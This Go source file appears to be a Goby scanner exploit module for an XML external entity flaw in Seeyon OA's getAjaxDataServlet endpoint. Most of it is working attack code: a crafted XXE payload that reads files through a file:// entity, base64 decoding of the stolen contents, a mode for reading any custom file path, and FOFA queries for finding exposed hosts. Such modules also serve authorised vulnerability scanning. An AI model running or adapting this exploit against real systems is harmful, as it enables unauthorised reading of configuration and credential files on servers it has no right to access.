package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "SEEYON-OA getAjaxDataServlet XML External Entity Injection Vulnerability",
    "Description": "<p>Seeyon-OA is an enterprise-level collaborative office platform developed by Zhiyuan Interconnection Software Co., Ltd., a Chinese company. This product primarily helps businesses achieve efficient and intelligent office automation processes, enhancing organizational efficiency and management levels.</p>",
    "Product": "SEEYON-OA",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-08-02",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\") || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || banner=\"Server: SY8044\"",
    "GobyQuery": "body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\") || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || banner=\"Server: SY8044\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p> 2. Set access policies and whitelist access through security devices such as firewalls. </p><p> 3. If not necessary, prohibit public network access to the system. </p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/c:/windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "XML External Entity Injection"
    ],
    "VulType": [
        "XML External Entity Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "致远互联-OA getAjaxDataServlet XML外部实体注入漏洞",
            "Product": "致远互联-OA",
            "Description": "<p>“致远互联-OA”是一款由中国公司致远互联软件股份有限公司开发的企业级协同办公平台。这款产品主要帮助企业实现高效、智能的办公自动化流程，提高组织内部的工作效率和管理水平。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p>&nbsp;2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "XML外部实体注入"
            ],
            "Tags": [
                "两高一弱",
                "XML外部实体注入"
            ]
        },
        "EN": {
            "Name": "SEEYON-OA getAjaxDataServlet XML External Entity Injection Vulnerability",
            "Product": "SEEYON-OA",
            "Description": "<p>Seeyon-OA is an enterprise-level collaborative office platform developed by Zhiyuan Interconnection Software Co., Ltd., a Chinese company. This product primarily helps businesses achieve efficient and intelligent office automation processes, enhancing organizational efficiency and management levels.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p>&nbsp;2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.&nbsp;<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "XML External Entity Injection"
            ],
            "Tags": [
                "2H1W",
                "XML External Entity Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9950"
}`

	postOrGet_Ai9QVqXcnX := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {

		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		//请求
		defineHeader := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}
		urlPost := "/seeyon/m-signature/RunSignature/run/getAjaxDataServlet"
		urlEncodedPayload := `S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=`
		rawPayload := fmt.Sprintf("<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///%s\" >\n]>\n<Signature><Field><a Index=\"ProtectItem\">true</a><b Index=\"Caption\">caption</b><c Index=\"ID\">id</c><d Index=\"VALUE\">&xxe;</d></Field></Signature>", filePath)
		urlEncodedPayload = urlEncodedPayload + url.QueryEscape(rawPayload)
		resp, err := setPostRequest(hostInfo, urlPost, urlEncodedPayload, defineHeader)

		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}

		regular := `encodeValue=([\s\S]*)]]]`
		makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			reRequest := regexp.MustCompile(RegularUrl)
			if !reRequest.MatchString(RegularContent) {
				return "", fmt.Errorf("can't match value")
			}
			getname := reRequest.FindStringSubmatch(RegularContent)
			return getname[1], nil
		}
		b64Output, err := makeRegular(resp.RawBody, regular)
		decodedBytes, err := base64.StdEncoding.DecodeString(b64Output)
		if err != nil {
			return "", errors.New("base64 decode failed")
		}
		respOutput := string(decodedBytes)

		// 注意：返回值为（最终要返回的读取结果，错误）
		return respOutput, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/seeyon/m-signature/RunSignature/run/getAjaxDataServlet"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/c:/windows/win.ini": "for 16-bit app support",
			}
			// 函数继承
			fileReadFunc := postOrGet_Ai9QVqXcnX

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for filePath, fileText := range defaultModeMap {
				resp, err := fileReadFunc(u, filePath)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"/c:/windows/win.ini", "for 16-bit app support"},
			}
			// 此处需要修改：函数继承
			fileReadFunc := postOrGet_Ai9QVqXcnX

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
